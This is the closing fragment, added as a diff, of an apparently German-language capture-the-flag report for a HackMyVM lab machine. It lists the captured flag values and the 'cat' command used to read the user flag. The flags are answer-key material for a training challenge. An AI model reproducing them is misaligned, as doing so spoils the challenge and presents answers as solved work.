+                     <div class="flag-value"><span class="password">hmv{2Mxtnwrht0ogHB6}</span></div>
+                 </div>
+                 <!-- User Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/atenea/user.txt</div> <!-- Korrekter Pfad -->
+                     <div class="flag-value"><span class="password">hmv{c4HqWSzRVKNDpTL}</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nmap/Wget Scan extrahiert -->
+        <p>Berichtsdatum: 10. Oktober 2022</p>
+    </footer>
+</body>
+</html>
